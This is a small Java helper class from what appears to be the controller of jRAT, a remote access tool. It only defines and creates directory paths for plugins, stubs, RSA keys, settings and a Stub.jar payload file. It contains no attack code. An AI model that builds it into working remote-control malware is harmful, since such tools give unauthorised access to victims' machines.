package se.jrat.controller;

import java.io.File;

public class Globals {

	/**
	 * @return global file directory
	 */
	public static final File getFileDirectory() {
		return new File("files/");
	}

	/**
	 * @return help documents directory in {@link #getFileDirectory()}
	 */
	public static final File getHelpDocDirectory() {
		return new File(getFileDirectory(), "help/");
	}

	/**
	 * @return plugin directory in {@link #getFileDirectory()}
	 */
	public static final File getPluginDirectory() {
		return new File(getFileDirectory(), "plugins/");
	}

	/**
	 * @return plugin stubs directory in {@link #getFileDirectory()}
	 */
	public static final File getPluginStubDirectory() {
		return new File(getPluginDirectory(), "stubs/");
	}
	
	/**
	 * @return notes directory in {@link #getFileDirectory()}
	 */
	public static final File getNotesDirectory() {
		return new File(getFileDirectory(), "notes/");
	}
	
	/**
	 * @return settings directory in {@link #getFileDirectory()}
	 */
	public static final File getSettingsDirectory() {
		return new File(getFileDirectory(), "settings/");
	}
	
	/**
	 * @return keypair directory in {@link #getFileDirectory()}
	 */
	public static final File getRSAKeysDirectory() {
		return new File(getFileDirectory(), "rsakeys/");
	}
	
	/**
	 * @return library directory in {@link #getFileDirectory()}
	 */
	public static final File getLibDirectory() {
		return new File(getFileDirectory(), "lib/");
	}
	
	/**
	 * @return stub file in {@link #getFileDirectory()}
	 */
	public static final File getStub() {
		return new File(getFileDirectory(), "Stub.jar");
	}
	
	/**
	 * @return default keyfile jrat.key in {@link #getFileDirectory()}
	 */
	public static final File getKeyFile() {
		return getKeyFile("");
	}
	
	/**
	 * @param s string between jrat and .key
	 * @return key file in {@link #getFileDirectory()}
	 */
	public static final File getKeyFile(String s) {
		return new File(getFileDirectory(), "jrat" + s + ".key");
	}
	
	/**
	 * @return Updater file in {@link #getFileDirectory()}
	 */
	public static final File getUpdater() {
		return new File(getFileDirectory(), "Updater.jar");
	}
	
	/**
	 * Create all directories
	 */
	public static void mkdirs() {
		getFileDirectory().mkdirs();
		getHelpDocDirectory().mkdirs();

		getPluginDirectory().mkdirs();
		getPluginStubDirectory().mkdirs();
		getNotesDirectory().mkdirs();
		getSettingsDirectory().mkdirs();
		getRSAKeysDirectory().mkdirs();
		getLibDirectory().mkdirs();
	}
}
